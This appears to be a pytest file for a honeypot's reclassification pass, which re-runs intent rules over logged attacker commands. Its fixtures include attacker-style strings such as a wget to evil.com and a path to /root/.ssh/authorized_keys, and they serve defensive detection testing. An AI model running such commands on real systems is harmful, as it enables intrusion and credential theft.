"""Re-running the rules over commands that previously matched none.

Rule improvements are worthless to the 300k rows already stored unless they are
applied retroactively. This is the pass that does that.
"""

from datetime import datetime

from app.models import Attempt
from app.services.reclassify import reclassify_unknown

NOW = datetime(2026, 9, 10, 12, 0, 0)


def add(db, command, intent="unknown", mitre_id="T1059", session_id="s1"):
    a = Attempt(
        sensor_id="local", session_id=session_id, event_id=f"e-{command[:20]}",
        timestamp=NOW, src_ip="1.2.3.4", command=command,
        protocol="ssh", dst_port=22,
        intent=intent, mitre_id=mitre_id,
    )
    db.add(a)
    db.commit()
    return a


class TestReclassifyUnknown:
    def test_applies_a_rule_that_now_matches(self, db_session):
        a = add(db_session, "[ -f /proc/version ]")
        assert reclassify_unknown(db_session) == 1
        db_session.refresh(a)
        assert a.intent == "reconnaissance"
        assert a.mitre_id == "T1082"

    def test_leaves_genuinely_unclassifiable_rows_alone(self, db_session):
        a = add(db_session, "echo xsec")
        assert reclassify_unknown(db_session) == 0
        db_session.refresh(a)
        assert a.intent == "unknown"

    def test_never_touches_an_already_classified_row(self, db_session):
        """Only the abstentions are revisited — this is not a re-label of everything."""
        a = add(db_session, "wget http://evil.com/x", intent="reconnaissance", mitre_id="T1082")
        assert reclassify_unknown(db_session) == 0
        db_session.refresh(a)
        assert a.intent == "reconnaissance"

    def test_skips_synthetic_file_transfer_rows(self, db_session):
        """`download: <url>` is not a command.

        Ingestion writes these for file-transfer events and sets the intent
        directly, never through the rules. Feeding one to the classifier reads
        the URL as if it were a shell command and produces nonsense.
        """
        a = add(db_session, "download: /root/.ssh/authorized_keys")
        b = add(db_session, "upload: /tmp/payload", session_id="s2")
        assert reclassify_unknown(db_session) == 0
        for row in (a, b):
            db_session.refresh(row)
            assert row.intent == "unknown"

    def test_respects_the_batch_limit(self, db_session):
        for i in range(5):
            add(db_session, f"[ -f /proc/version ] #{i}", session_id=f"s{i}")
        assert reclassify_unknown(db_session, limit=2) == 2

    def test_is_safe_to_run_again(self, db_session):
        add(db_session, "[ -f /proc/version ]")
        assert reclassify_unknown(db_session) == 1
        assert reclassify_unknown(db_session) == 0

    def test_ignores_rows_with_no_command(self, db_session):
        """Login attempts carry an intent but no command."""
        add(db_session, "", intent="unknown")
        assert reclassify_unknown(db_session) == 0
